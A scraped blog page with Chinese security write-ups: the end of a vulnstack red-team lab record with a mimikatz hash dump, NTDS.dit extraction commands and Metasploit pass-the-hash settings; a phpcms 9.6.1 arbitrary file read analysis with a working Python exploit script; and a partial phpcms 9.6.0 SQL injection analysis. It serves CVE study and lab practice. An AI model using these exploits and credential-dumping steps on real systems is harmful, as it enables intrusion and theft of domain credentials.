-Domain : GOD / S-1-5-21-2952760202-1353902439-2381784089
-Session           : Service from 0
-User Name         : OWA$
-Domain            : GOD
-Logon Server      : (null)
-Logon Time        : 2020/2/16 20:59:23
-SID               : S-1-5-20
-    msv :    
-     [00000003] Primary
-     * Username : OWA$
-     * Domain   : GOD
-     * NTLM     : f8ddc71a57488df64708651271185969
-     * SHA1     : 93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf
-    tspkg :    
-    wdigest :    
-     * Username : OWA$
-     * Domain   : GOD
-     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65 
-    kerberos :    
-     * Username : owa$
-     * Domain   : GOD.ORG
-     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65 
-    ssp :    
-    credman :    
-
-Authentication Id : 0 ; 47752 (00000000:0000ba88)
-Session           : UndefinedLogonType from 0
-User Name         : (null)
-Domain            : (null)
-Logon Server      : (null)
-Logon Time        : 2020/2/16 20:59:18
-SID               : 
-    msv :    
-     [00000003] Primary
-     * Username : OWA$
-     * Domain   : GOD
-     * NTLM     : f8ddc71a57488df64708651271185969
-     * SHA1     : 93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf
-     * NTLM     : f8ddc71a57488df64708651271185969:93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf
-    tspkg :    
-    wdigest :    
-    kerberos :    
-    ssp :    
-    credman :    
-
-Authentication Id : 0 ; 995 (00000000:000003e3)
-Session           : Service from 0
-User Name         : IUSR
-Domain            : NT AUTHORITY
-Logon Server      : (null)
-Logon Time        : 2020/2/16 21:00:06
-SID               : S-1-5-17
-    msv :    
-    tspkg :    
-    wdigest :    
-     * Username : (null)
-     * Domain   : (null)
-     * Password : (null)
-    kerberos :    
-    ssp :    
-    credman :    
-
-Authentication Id : 0 ; 997 (00000000:000003e5)
-Session           : Service from 0
-User Name         : LOCAL SERVICE
-Domain            : NT AUTHORITY
-Logon Server      : (null)
-Logon Time        : 2020/2/16 20:59:23
-SID               : S-1-5-19
-    msv :    
-    tspkg :    
-    wdigest :    
-     * Username : (null)
-     * Domain   : (null)
-     * Password : (null)
-    kerberos :    
-     * Username : (null)
-     * Domain   : (null)
-     * Password : (null)
-    ssp :    
-    credman :    
-
-Authentication Id : 0 ; 999 (00000000:000003e7)
-Session           : UndefinedLogonType from 0
-User Name         : OWA$
-Domain            : GOD
-Logon Server      : (null)
-Logon Time        : 2020/2/16 20:59:17
-SID               : S-1-5-18
-    msv :    
-    tspkg :    
-    wdigest :    
-     * Username : OWA$
-     * Domain   : GOD
-     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65 
-    kerberos :    
-     * Username : owa$
-     * Domain   : GOD.ORG
-     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65 
-    ssp :    
-    credman :    
-** SAM ACCOUNT **
-
-SAM Username         : krbtgt
-Object Security ID   : S-1-5-21-2952760202-1353902439-2381784089-502
-Object Relative ID   : 502
-
-Credentials:
-  Hash NTLM: 58e91a5ac358d86513ab224312314061
-
-Object RDN           : Read-only Domain Controllers
-
-** SAM ACCOUNT **
-
-SAM Username         : Administrator
-Object Security ID   : S-1-5-21-2952760202-1353902439-2381784089-500
-Object Relative ID   : 500
-
-Credentials:
-  Hash NTLM: a45a7246dd74b64a67f22fd7020f1bd8
-
-Object RDN           : Administrators
-
-
-502    krbtgt    58e91a5ac358d86513ab224312314061
-1106    ligang    1e3d22f88dfd250c9312d21686c60f41
-1107    DEV1$    bed18e5b9d13bb384a3041a10d43c01b
-1104    ROOT-TVI862UBEH$    5604267003351107febdc6ed4e2dfdce
-1105    STU1$    cb45e05d22e8106184056e55ac541149
-500    Administrator    a45a7246dd74b64a67f22fd7020f1bd8
-1001    OWA$    f8ddc71a57488df64708651271185969
-1108    gqy    aa3afe73b6e0c2d87b3a428bf696ae71
-1000    liukaifeng01    a45a7246dd74b64a67f22fd7020f1bd8
-</code></pre><p>可惜没有明文密码</p>
-<p>利用pth登陆Administrator</p>
-<p>先导出system 和 NTDS.dit</p>
-<pre><code>ntdsutil &quot;ac i ntds&quot; ifm &quot;create full c:\users\tmp&quot; q q
-
-NTDSDumpEx -d ntds.dit -s system -o domain.txt
-得到hash
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8:::</code></pre><p>用msf上的<code>exploit/windows/smb/psexec</code>来进行pth攻击</p>
-<pre><code>use exploit/windows/smb/psexec
-set payload windows/meterpreter/bind_tcp
-set rhost xxx
-set lport xxx
-set rhosts 192.168.52.138
-set smbuser Administrator
-set smbpass aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8</code></pre><p><img src="https://i.loli.net/2020/02/17/9oLDYlWv5GBwOUN.png" alt="image12506"></p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/17/vulnstackATT&CK红队评估靶场1渗透记录/">http://blog.ccreater.top/2020/02/17/vulnstackATT&amp;CK红队评估靶场1渗透记录/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/17/vulnstackATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E9%9D%B6%E5%9C%BA1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" data-id="ckmn4mn3m006ng4ni1trg1gio" data-title="vulnstackATT&amp;CK红队评估靶场1渗透记录" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
-    <article id="post-phpcmsv9.6.1任意文件读取" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/02/13/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
-  <time class="dt-published" datetime="2020-02-13T08:09:55.411Z" itemprop="datePublished">2020-02-13</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/13/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">phpcmsv9.6.1任意文件读取</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="phpcmsv9-6-1任意文件读取"><a href="#phpcmsv9-6-1任意文件读取" class="headerlink" title="phpcmsv9.6.1任意文件读取"></a>phpcmsv9.6.1任意文件读取</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞位置: <code>phpcms/modules/content/down.php</code> 。在该文件的 <code>download</code> 方法中最后一行调用了 <code>file_down</code> 文件下载函数，我们可以看到其第一个参数是要读取的文件路径。 </p>
-<pre><code class="php">    public function download() {
-        $a_k = trim($_GET[&#39;a_k&#39;]);
-        $pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);
-        $a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);
-        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));
-        unset($i,$m,$f,$t,$ip);
-        parse_str($a_k);        
-        ...
-        $starttime = intval($t);
-        if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) showmessage(L(&#39;url_error&#39;));
-        $fileurl = trim($f);
-        if(!$downid || empty($fileurl) || !preg_match(&quot;/[0-9]{10}/&quot;, $starttime) || !preg_match(&quot;/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/&quot;, $ip) || $ip != ip()) showmessage(L(&#39;illegal_parameters&#39;));    
-        $endtime = SYS_TIME - $starttime;
-        if($endtime &gt; 3600) showmessage(L(&#39;url_invalid&#39;));
-        if($m) $fileurl = trim($s).trim($fileurl);
-        if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));
-        //远程文件
-        if(strpos($fileurl, &#39;:/&#39;) &amp;&amp; (strpos($fileurl, pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;)) === false)) { 
-            header(&quot;Location: $fileurl&quot;);
-        } else {
-            if($d == 0) {
-                header(&quot;Location: &quot;.$fileurl);
-            } else {
-                $fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);
-                $filename = basename($fileurl);
-                //处理中文文件
-                if(preg_match(&quot;/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/&quot;, $fileurl)) {
-                    $filename = str_replace(array(&quot;%5C&quot;, &quot;%2F&quot;, &quot;%3A&quot;), array(&quot;\\&quot;, &quot;/&quot;, &quot;:&quot;), urlencode($fileurl));
-                    $filename = urldecode(basename($filename));
-                }
-                $ext = fileext($filename);
-                $filename = date(&#39;Ymd_his&#39;).random(3).&#39;.&#39;.$ext;
-                $fileurl=str_replace(array(&quot;&lt;&quot;,&quot;&gt;&quot;),&quot;&quot;,$fileurl);
-                file_down($fileurl, $filename);
-            }
-        }
-    }</code></pre>
-<p>我们跟进<code>file_down</code>:</p>
-<pre><code class="php">function file_down($filepath, $filename = &#39;&#39;) {
-    if(!$filename) $filename = basename($filepath);
-    if(is_ie()) $filename = rawurlencode($filename);
-    $filetype = fileext($filename);
-    $filesize = sprintf(&quot;%u&quot;, filesize($filepath));
-    if(ob_get_length() !== false) @ob_end_clean();
-    header(&#39;Pragma: public&#39;);
-    header(&#39;Last-Modified: &#39;.gmdate(&#39;D, d M Y H:i:s&#39;) . &#39; GMT&#39;);
-    header(&#39;Cache-Control: no-store, no-cache, must-revalidate&#39;);
-    header(&#39;Cache-Control: pre-check=0, post-check=0, max-age=0&#39;);
-    header(&#39;Content-Transfer-Encoding: binary&#39;);
-    header(&#39;Content-Encoding: none&#39;);
-    header(&#39;Content-type: &#39;.$filetype);
-    header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.$filename.&#39;&quot;&#39;);
-    header(&#39;Content-length: &#39;.$filesize);
-    readfile($filepath);
-    exit;
-}</code></pre>
-<p>可以看到他会直接读取文件然后,exit</p>
-<p>我们再看下<code>download</code>中的<code>$fileurl</code>的生成过程:</p>
-<pre><code class="php">if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) showmessage(L(&#39;url_error&#39;));
-if($m) $fileurl = trim($s).trim($fileurl);
-if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));
-$fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);
-$fileurl=str_replace(array(&quot;&lt;&quot;,&quot;&gt;&quot;),&quot;&quot;,$fileurl);</code></pre>
-<p><code>$fileurl</code>由<code>$f</code>产生的,其中不能带有php等关键字,但是我们可以利用最后一行的str_replace来绕过,而<code>$f</code>由<code>parse_str($a_k)</code>得来的</p>
-<p>那么接下来我们要找一处</p>
-<pre><code class="php">$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);
-$a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);</code></pre>
-<p>以<code>$pc_auth_key</code>作为密钥的加密点</p>
-<p><img src="https://i.loli.net/2020/02/13/csXBxCmkdWqj3or.png" alt="image3860"></p>
-<p>显然只有中间的那个可以</p>
-<pre><code class="php">$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);
-$a_k = urlencode(sys_auth(&quot;i=$i&amp;d=$d&amp;s=$s&amp;t=&quot;.SYS_TIME.&quot;&amp;ip=&quot;.ip().&quot;&amp;m=&quot;.$m.&quot;&amp;f=$f&amp;modelid=&quot;.$modelid, &#39;ENCODE&#39;, $pc_auth_key));
-$downurl = &#39;?m=content&amp;c=down&amp;a=download&amp;a_k=&#39;.$a_k;</code></pre>
-<p>而<code>$i,$m,$f</code>等都是从<code>parse_str($a_k);</code>获得</p>
-<pre><code class="php">        parse_str($a_k);
-        if(isset($i)) $i = $id = intval($i);
-        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));
-        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));
-        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));</code></pre>
-<p>接下来就跟9.6.0版本的sql注入相同了</p>
-<h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import re
-import requests
-import random
-from urllib.parse import quote
-def poc(url,proxies={}):
-    sess=requests.session()
-    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)
-    sess.proxies=proxies
-    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;
-    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]
-    param={
-        &quot;m&quot;:&quot;attachment&quot;,
-        &quot;c&quot;:&quot;attachments&quot;,
-        &quot;a&quot;:&quot;swfupload_json&quot;,
-        &quot;src&quot;:&quot;=1&amp;m=aa&amp;i=1&amp;modelid=1&amp;catid=1&amp;f=%s&amp;ss=&quot; % quote(&quot;index.p&lt;h&lt;p&amp;d=1&quot;)
-    }
-    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})
-    #print(sess.cookies.get_dict())
-    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]
-    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text
-    #print(userid,a_k)
-    a_k=re.search(&#39;&#39;&#39;a_k=([^&quot;]*)&#39;&#39;&#39;,result).groups()[0]
-    #print(result)
-    #print(a_k)
-    res=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=download&amp;a_k=%s&quot;%(url,a_k))
-    if res.status_code==200 and &quot;pc_base::creat_app();&quot; in res.text:
-        return True
-    else :
-        return False
-
-
-
-#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}
-print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.1/&quot;))</code></pre>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集/" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集/</a> </p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/13/phpcmsv9.6.1任意文件读取/">http://blog.ccreater.top/2020/02/13/phpcmsv9.6.1任意文件读取/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/13/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="ckmn4mn3b005hg4nifay5fptc" data-title="phpcmsv9.6.1任意文件读取" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
-    <article id="post-phpcmsv9.6.0SQL注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/" class="article-date">
-  <time class="dt-published" datetime="2020-02-12T16:25:04.827Z" itemprop="datePublished">2020-02-13</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/">phpcmsv9.6.0SQL注入</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="phpcmsv9-6-0SQL注入"><a href="#phpcmsv9-6-0SQL注入" class="headerlink" title="phpcmsv9.6.0SQL注入"></a>phpcmsv9.6.0SQL注入</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
-<li>开启wap</li>
-<li>phpcms 版本小于等于9.6.0</li>
-</ol>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞信息:</p>
-<blockquote>
-<p>这个版本的 <strong>SQL注入</strong> 主要在于程序对解密后的数据没有进行过滤. 漏洞文件: <strong>phpcms/modules/content/down.php</strong> 。在其 <strong>init</strong> 方法中，从 <strong>GET</strong> 数据中获取了 <strong>a_k</strong> 的值 ,解密后直接变量覆盖,导致命令执行</p>
-</blockquote>
-<pre><code class="php">public function init() {
-        $a_k = trim($_GET[&#39;a_k&#39;]);
-        $a_k = sys_auth($a_k, &#39;DECODE&#39;, pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;));
-        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));
-        parse_str($a_k);
-        if(isset($i)) $i = $id = intval($i);
-        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));
-        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));
-        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));
-        $allow_visitor = 1;
-        $MODEL = getcache(&#39;model&#39;,&#39;commons&#39;);
-        $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid][&#39;tablename&#39;];
-        $this-&gt;db-&gt;table_name = $tablename.&#39;_data&#39;;
-        $rs = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));    
-        ...
-    }</code></pre>
-<p><code>$this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));</code>跟进去</p>
-<pre><code class="php">final public function get_one($where = &#39;&#39;, $data = &#39;*&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {
-        if (is_array($where)) $where = $this-&gt;sqls($where);
-        return $this-&gt;db-&gt;get_one($data, $this-&gt;table_name, $where, $order, $group);
-    }</code></pre>
-<pre><code class="php">final public function sqls($where, $font = &#39; AND &#39;) {
-        if (is_array($where)) {
-            $sql = &#39;&#39;;
-            foreach ($where as $key=&gt;$val) {
-                $sql .= $sql ? &quot; $font `$key` = &#39;$val&#39; &quot; : &quot; `$key` = &#39;$val&#39;&quot;;
-            }
-            return $sql;
-        } else {
-            return $where;
-        }
-    }</code></pre>
-<pre><code class="php">public function get_one($data, $table, $where = &#39;&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {
-        $where = $where == &#39;&#39; ? &#39;&#39; : &#39; WHERE &#39;.$where;
-        $order = $order == &#39;&#39; ? &#39;&#39; : &#39; ORDER BY &#39;.$order;
-        $group = $group == &#39;&#39; ? &#39;&#39; : &#39; GROUP BY &#39;.$group;
-        $limit = &#39; LIMIT 1&#39;;
-        $field = explode( &#39;,&#39;, $data);
-        array_walk($field, array($this, &#39;add_special_char&#39;));
-        $data = implode(&#39;,&#39;, $field);
-
-        $sql = &#39;SELECT &#39;.$data.&#39; FROM `&#39;.$this-&gt;config[&#39;database&#39;].&#39;`.`&#39;.$table.&#39;`&#39;.$where.$group.$order.$limit;
-        $this-&gt;execute($sql);
-        $res = $this-&gt;fetch_next();
-        $this-&gt;free_result();
-        return $res;
-    }</code></pre>
-<p>没有对解密后的id进行任何过滤</p>
-<p>接着要找一个能用相同密钥加密的地方,这样便无需暴露auth_key就能执行恶意sql语句</p>
-<p>我们利用<code>set_cookie</code>来生成加密数据</p>
-<p><code>setcookie($var, sys_auth($value, &#39;ENCODE&#39;), $time, pc_base::load_config(&#39;system&#39;,&#39;cookie_path&#39;), pc_base::load_config(&#39;system&#39;,&#39;cookie_domain&#39;), $s);</code></p>
-<p>查找调用<code>set_cookie</code>且值<code>$value</code>可控的位置</p>
-<p><code>phpcms/modules/attachment/attachments.php</code> 文件的 <code>swfupload_json</code> 方法有满足我们需要的代码。(菜鸡直接看别人找到的)</p>
-<pre><code class="php">public function swfupload_json() {
-        $arr[&#39;aid&#39;] = intval($_GET[&#39;aid&#39;]);
-        $arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));
-        $arr[&#39;filename&#39;] = urlencode(safe_replace($_GET[&#39;filename&#39;]));
-        $json_str = json_encode($arr);
-        $att_arr_exist = param::get_cookie(&#39;att_json&#39;);
-        $att_arr_exist_tmp = explode(&#39;||&#39;, $att_arr_exist);
-        if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {
-            return true;
-        } else {
-            $json_str = $att_arr_exist ? $att_arr_exist.&#39;||&#39;.$json_str : $json_str;
-            param::set_cookie(&#39;att_json&#39;,$json_str);
-            return true;            
-        }
-    }</code></pre>
-<p><code>$arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));</code>,跟进<code>safe_replace</code></p>
-<pre><code class="php">function safe_replace($string) {
-    $string = str_replace(&#39;%20&#39;,&#39;&#39;,$string);
-    $string = str_replace(&#39;%27&#39;,&#39;&#39;,$string);
-    $string = str_replace(&#39;%2527&#39;,&#39;&#39;,$string);
-    $string = str_replace(&#39;*&#39;,&#39;&#39;,$string);
-    $string = str_replace(&#39;&quot;&#39;,&#39;&amp;quot;&#39;,$string);
-    $string = str_replace(&quot;&#39;&quot;,&#39;&#39;,$string);
-    $string = str_replace(&#39;&quot;&#39;,&#39;&#39;,$string);
-    $string = str_replace(&#39;;&#39;,&#39;&#39;,$string);
-    $string = str_replace(&#39;&lt;&#39;,&#39;&amp;lt;&#39;,$string);
-    $string = str_replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;,$string);
-    $string = str_replace(&quot;{&quot;,&#39;&#39;,$string);
-    $string = str_replace(&#39;}&#39;,&#39;&#39;,$string);
-    $string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);
-    return $string;
-}</code></pre>
-<p>虽然这里单引号被过滤了,但是前面是用<code>parse_str($a_k);</code>来恢复变量的,我们可以利用<code>safe_replace</code>能将某些字符替换为空格用url编码来绕过黑名单</p>
-<p>但是在调用<code>swfupload_json</code> 前,它还会调用<code>__construct</code>方法</p>
-<pre><code class="php">function __construct() {
-        pc_base::load_app_func(&#39;global&#39;);
-        $this-&gt;upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);
-        $this-&gt;upload_path = pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;);        
-        $this-&gt;imgext = array(&#39;jpg&#39;,&#39;gif&#39;,&#39;png&#39;,&#39;bmp&#39;,&#39;jpeg&#39;);
-        $this-&gt;userid = $_SESSION[&#39;userid&#39;] ? $_SESSION[&#39;userid&#39;] : (param::get_cookie(&#39;_userid&#39;) ? param::get_cookie(&#39;_userid&#39;) : sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));
-        $this-&gt;isadmin = $this-&gt;admin_username = $_SESSION[&#39;roleid&#39;] ? 1 : 0;
